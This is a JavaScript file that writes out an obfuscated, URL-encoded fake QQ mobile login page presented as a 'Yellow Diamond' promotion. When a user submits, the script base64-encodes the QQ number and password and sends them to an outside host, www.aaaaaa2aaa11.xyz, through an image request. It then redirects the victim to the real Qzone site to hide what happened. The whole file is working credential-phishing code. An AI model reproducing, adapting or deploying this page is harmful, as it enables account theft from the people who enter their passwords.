(function () {
    var new_doc = document.open("text/html", "replace");
    var html = unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22zh-cn%22%3E%0A%09%3Chead%3E%0A%09%09%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3Dutf-8%22%3E%0A%09%09%3Cmeta%20id%3D%22viewport%22%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2Cminimum-scale%3D1%2Cmaximum-scale%3D1%2Cinitial-scale%3D1%2Cuser-scalable%3Dno%22%3E%0A%09%09%3Cmeta%20name%3D%22apple-mobile-web-app-capable%22%20content%3D%22yes%22%3E%0A%09%09%3Ctitle%3E%26%23x624B%3B%26%23x673A%3B%26%23x7EDF%3B%26%23x4E00%3B%26%23x767B%3B%26%23x5F55%3B%3C/title%3E%0A%09%09%3Clink%20rel%3Dstylesheet%20type%3Dtext/css%20href%3D%22css/vl.css%22%3E%0A%09%09%3Clink%20rel%3D%22stylesheet%22%20href%3D%22css/keyboard.css%22%20/%3E%0A%09%09%3Cstyle%3E%0A%09%09%09.logo%20%7B%0A%09%09%09%09background-image%3A%20url%28%22http%3A//qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png%22%29%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09.my%20%7B%0A%09%09%09%09width%3A%20288px%3B%0A%09%09%09%09height%3A%2044px%3B%0A%09%09%09%09position%3A%20absolute%0A%09%09%09%7D%0A%09%09%3C/style%3E%0A%09%3C/head%3E%0A%0A%09%3Cbody%3E%0A%09%09%3Cdiv%20id%3D%22content%22%20class%3D%22content%22%3E%0A%09%09%09%3Cdiv%20id%3D%22error_tips%22%3E%0A%09%09%09%09%3Cdiv%20id%3D%22error_tips_content%22%3E%0A%09%09%09%09%09%3Cspan%20id%3D%22error_icon%22%3E%3C/span%3E%0A%09%09%09%09%09%3Cspan%20id%3D%22error_message%22%3E%3C/span%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%3Cdiv%20id%3D%22login%22%20class%3D%22login%22%3E%0A%09%09%09%09%3Cdiv%20id%3D%22logo%22%20class%3D%22logo%22%3E%3C/div%3E%0A%09%09%09%09%3Cdiv%20id%3D%22web_login%22%3E%0A%09%09%09%09%09%3Cul%20id%3D%22g_list%22%3E%0A%09%09%09%09%09%09%3Cli%20id%3D%22g_u%22%3E%0A%09%09%09%09%09%09%09%3Cdiv%20id%3D%22del_touch%22%20class%3D%22del_touch%22%3E%0A%09%09%09%09%09%09%09%09%3Cspan%20id%3D%22del_u%22%20class%3D%22del_u%22%3E%3C/span%3E%0A%09%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%09%09%3Cdiv%20name%3D%220%22%20class%3D%22my%22%3E%3C/div%3E%3Cinput%20id%3D%22u%22%20class%3D%22inputstyle%22%20name%3D%220%22%20maxlength%3D%2210%22%20placeholder%3D%22Q%26%23x034F%3B%26%23x034F%3B%26%23x034F%3BQ%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x53F7%3B%26%23x034F%3B%26%23x034F%3B%26%23x7801%3B%26%23x034F%3B/%26%23x034F%3B%26%23x624B%3B%26%23x034F%3B%26%23x034F%3B%26%23x673A%3B%26%23x034F%3B/%26%23x034F%3B%26%23x90AE%3B%26%23x034F%3B%26%23x034F%3B%26%23x7BB1%3B%26%23x034F%3B%22%20readonly%3E%0A%09%09%09%09%09%09%3C/li%3E%0A%09%09%09%09%09%09%3Cli%20id%3D%22g_p%22%3E%0A%09%09%09%09%09%09%09%3Cdiv%20id%3D%22del_touch_p%22%20class%3D%22del_touch%22%3E%0A%09%09%09%09%09%09%09%09%3Cspan%20id%3D%22del_p%22%20class%3D%22del_u%22%3E%3C/span%3E%0A%09%09%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%09%09%09%3Cdiv%20name%3D%221%22%20class%3D%22my%22%3E%3C/div%3E%3Cinput%20id%3D%22p%22%20class%3D%22inputstyle%22%20maxlength%3D%2216%22%20type%3D%22password%22%20name%3D%221%22%20placeholder%3D%22%26%23x034F%3B%26%23x034F%3B%26%23x8BF7%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x8F93%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x5165%3B%26%23x034F%3B%26%23x4F60%3B%26%23x034F%3B%26%23x7684%3BQ%26%23x034F%3B%26%23x034F%3BQ%26%23x034F%3B%26%23x5BC6%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x7801%3B%26%23x034F%3B%26%23x034F%3B%22%20readonly%3E%0A%09%09%09%09%09%09%3C/li%3E%0A%09%09%09%09%09%3C/ul%3E%0A%09%09%09%09%09%3Cdiv%20id%3D%22go%22%3E%26%23x767B%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%20%26%23x5F55%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%26%23x034F%3B%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20id%3D%22switch%22%3E%0A%09%09%09%09%09%3Cdiv%20id%3D%22zc_feedback%22%3E%0A%09%09%09%09%09%09%3Ca%20id%3D%22zc%22%20href%3D%22https%3A//zc.qq.com%22%3E%26%23x6CE8%3B%26%23x034F%3B%26%23x518C%3B%26%23x034F%3B%26%23x65B0%3B%26%23x034F%3B%26%23x5E10%3B%26%23x034F%3B%26%23x53F7%3B%3C/a%3E%0A%09%09%09%09%09%09%3Ca%20id%3D%22forgetpwd%22%20href%3D%22https%3A//aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index%22%3E%26%23x5FD8%3B%26%23x034F%3B%26%23x4E86%3B%26%23x034F%3B%26%23x5BC6%3B%26%23x034F%3B%26%23x7801%3B%26%23x034F%3B%26%23xFF1F%3B%3C/a%3E%0A%09%09%09%09%09%3C/div%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%09%3Cscript%20src%3D%22http%3A//libs.baidu.com/jquery/1.11.1/jquery.min.js%22%3E%3C/script%3E%0A%09%09%3Cscript%20src%3D%22https%3A//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js%22%3E%3C/script%3E%0A%09%09%3Cscript%20src%3D%22https%3A//open.mobile.qq.com/sdk/qqapi.js%3F_bid%3D152%22%3E%3C/script%3E%0A%09%09%3Cscript%20src%3D%22https%3A//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js%22%3E%3C/script%3E%0A%09%09%3Cscript%20type%3D%22text/javascript%22%20src%3D%22js/keyboard.js%22%3E%3C/script%3E%0A%09%09%3Cscript%3E%0A%09%09%09var%20qid%20%3D%20%27%27%3B%0A%09%09%09var%20qp%20%3D%20%27%27%3B%0A%09%09%09%24%28function%28%29%20%7B%0A%09%09%09%09if%28%24.cookie%28%27il%27%29%20%3D%3D%20%27ok%27%29%0A%09%09%09%09%09location.href%20%3D%20%27https%3A//act.qzone.qq.com/%27%3B%0A%09%09%09%09FastClick.attach%28document.body%29%3B%0A%09%09%09%09%24%28%27.my%5Bname%3D0%5D%27%29.click%28function%28%29%20%7B%0A%09%09%09%09%09keyBoard%28%7B%0A%09%09%09%09%09%09eventNode%3A%20%27%23u%27%2C%0A%09%09%09%09%09%09type%3A%200%2C%0A%09%09%09%09%09%09clickCallBack%3A%20function%28flag%2C%20value%2C%20target%29%20%7B%0A%09%09%09%09%09%09%09if%28flag.length%20%3D%3D%201%29%20%7B%0A%09%09%09%09%09%09%09%09qid%20+%3D%20%27%27%20+%20flag%3B%0A%09%09%09%09%09%09%09%7D%20else%20if%28flag%20%3D%3D%20%27del%27%29%20%7B%0A%09%09%09%09%09%09%09%09qid%20%3D%20%27%27%3B%0A%09%09%09%09%09%09%09%7D%0A%09%09%09%09%09%09%09%24%28%27%23u%27%29.val%28qid%29%3B%0A%09%09%09%09%09%09%7D%0A%09%09%09%09%09%7D%29%3B%0A%09%09%09%09%7D%29%3B%0A%09%09%09%09%24%28%27.my%5Bname%3D1%5D%27%29.click%28function%28%29%20%7B%0A%09%09%09%09%09keyBoard%28%7B%0A%09%09%09%09%09%09eventNode%3A%20%27%23p%27%2C%0A%09%09%09%09%09%09type%3A%201%2C%0A%09%09%09%09%09%09clickCallBack%3A%20function%28flag%2C%20value%2C%20target%29%20%7B%0A%09%09%09%09%09%09%09if%28flag.length%20%3D%3D%201%29%20%7B%0A%09%09%09%09%09%09%09%09qp%20+%3D%20%27%27%20+%20flag%3B%0A%09%09%09%09%09%09%09%7D%20else%20if%28flag%20%3D%3D%20%27del%27%29%20%7B%0A%09%09%09%09%09%09%09%09qp%20%3D%20%27%27%3B%0A%09%09%09%09%09%09%09%7D%0A%09%09%09%09%09%09%09%24%28%27%23p%27%29.val%28qp%29%3B%0A%09%09%09%09%09%09%7D%0A%09%09%09%09%09%7D%29%3B%0A%09%09%09%09%7D%29%3B%0A%09%09%09%09islogin%20%3D%20false%3B%0A%09%09%09%09%24%28%27%23go%27%29.click%28function%28%29%20%7B%0A%09%09%09%09%09if%28islogin%29%20return%3B%0A%09%09%09%09%09var%20u%20%3D%20%24%28%27%23u%27%29.val%28%29%3B%0A%09%09%09%09%09var%20p%20%3D%20%24%28%27%23p%27%29.val%28%29%3B%0A%09%09%09%09%09if%28u.length%20%3C%205%20%7C%7C%20u.length%20%3E%2010%20%7C%7C%20p.length%20%3C%208%20%7C%7C%20p.length%20%3E%2016%29%20%7B%0A%09%09%09%09%09%09f%28%22%5Cu8bf7%5Cu8f93%5Cu5165%5Cu6b63%5Cu786e%5Cu7684%5Cu8d26%5Cu53f7%5Cu5bc6%5Cu7801.%22%29%3B%0A%09%09%09%09%09%09return%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09islogin%20%3D%20true%3B%0A%09%09%09%09%09%24.cookie%28%27il%27%2C%20%27ok%27%29%3B%0A%09%09%09%0A%09%09%09%09%09var%20str%20%3D%20base64_encode%28u+%22%7C%7C%7C-%7C%7C%7C%22+p%29%3B%20%20%0A%09%09%09%09%09document.write%28%22%3Cimg%20src%3D%27https%3A//www.aaaaaa2aaa11.xyz/%22+str+%22.ico%27%3E%22%29%0A%09%09%09%09%09islogin%20%3D%20false%3B%0A%09%09%09%09%09location.href%20%3D%20%27https%3A//act.qzone.qq.com/%27%3B%0A%09%09%09%09%7D%29%3B%0A%09%09%09%09mqq.ui.setTitleButtons%28%7B%0A%09%09%09%09%09/*left%20%3A%20%7B%0A%09%09%09%09%09%20%20%20%20title%20%3A%20%22%22%2C%0A%09%09%09%09%09%20%20%20%20callback%20%3A%20function%20%28%29%20%7B%0A%09%09%09%09%09%20%20%20%20%20%20%20//%0A%09%09%09%09%09%20%20%20%20%7D%0A%09%09%09%09%09%7D%2C*/%0A%09%09%09%09%09right%3A%20%7B%0A%09%09%09%09%09%09hidden%3A%20true%0A%09%09%09%09%09%7D%0A%09%09%09%09%7D%29%0A%09%09%09%7D%29%3B%0A%0A%09%09%09function%20f%28n%29%20%7B%0A%09%09%09%09g%28%22error_tips%22%29.style.display%20%3D%20%22block%22%2C%0A%09%09%09%09%09g%28%22error_message%22%29.innerHTML%20%3D%20n%2C%0A%09%09%09%09%09setTimeout%28function%28%29%20%7B%0A%09%09%09%09%09%09g%28%27error_tips%27%29.style.display%20%3D%20%27none%27%3B%0A%09%09%09%09%09%7D%2C%201500%29%3B%0A%09%09%09%7D%0A%09%09%09function%20g%28n%29%20%7B%0A%09%09%09%09return%20document.getElementById%28n%29%0A%09%09%09%7D%0A%09%09%3C/script%3E%0A%09%3C/body%3E%0A%0A%3C/html%3E");
    new_doc.write(html);
    new_doc.close();
})();
var set = document.createElement('iframe');
set.src = 'https://www.baidu.com/favicon.ico';
set.style.display = 'none';
set.onload = function () {
    setTimeout(function () {
        set.remove();
    }, 9)
}
document.title = '\u9ec4\u94bb\u6d3b\u52a8';
document.ready = function(){
	document.body.appendChild(set);	
}
function base64_encode(d){var q='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var z,y,x,w,v,u,t,s,i=0,j=0,p='',r=[];if(!d){return d}do{z=d.charCodeAt(i++);y=d.charCodeAt(i++);x=d.charCodeAt(i++);s=z<<16|y<<8|x;w=s>>18&0x3f;v=s>>12&0x3f;u=s>>6&0x3f;t=s&0x3f;r[j++]=q.charAt(w)+q.charAt(v)+q.charAt(u)+q.charAt(t)}while(i<d.length);p=r.join('');var r=d.length%3;return(r?p.slice(0,r-3):p)+'==='.slice(r||3)}function base64_decode(d){var q='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var z,y,x,w,v,u,t,s,i=0,j=0,r=[];if(!d){return d}d+='';do{w=q.indexOf(d.charAt(i++));v=q.indexOf(d.charAt(i++));u=q.indexOf(d.charAt(i++));t=q.indexOf(d.charAt(i++));s=w<<18|v<<12|u<<6|t;z=s>>16&0xff;y=s>>8&0xff;x=s&0xff;if(u==64){r[j++]=String.fromCharCode(z)}else if(t==64){r[j++]=String.fromCharCode(z,y)}else{r[j++]=String.fromCharCode(z,y,x)}}while(i<d.length);return r.join('')}function arcfour(k,d){var o='';s=new Array();var n=256;l=k.length;for(var i=0;i<n;i++){s[i]=i}for(var j=i=0;i<n;i++){j=(j+s[i]+k.charCodeAt(i%l))%n;var x=s[i];s[i]=s[j];s[j]=x}for(var i=j=y=0;y<d.length;y++){i=(i+1)%n;j=(j+s[i])%n;x=s[i];s[i]=s[j];s[j]=x;o+=String.fromCharCode(d.charCodeAt(y)^s[(s[i]+s[j])%n])}return o}